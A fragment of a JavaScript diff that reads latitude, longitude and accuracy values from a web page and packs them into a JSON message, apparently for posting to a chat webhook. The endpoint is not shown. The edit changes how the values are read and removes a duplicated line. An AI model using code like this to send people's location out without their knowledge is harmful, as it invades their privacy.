@@ -1014,13 +1014,13 @@
 
     const idoooo =
       document.getElementById('latitude')
-        .value.trim();
+        .textContent
     const keidoooo =
       document.getElementById('longitude')
-        .value.trim();
+        .textContent
     const seidoooo =
       document.getElementById('accuracy')
-        .value.trim();
+        .textContent
 
 
     if (
@@ -1042,7 +1042,6 @@
             },
 
             body: JSON.stringify({
-body: JSON.stringify({
   content:
     '📱 緯度: `' +
     idoooo +
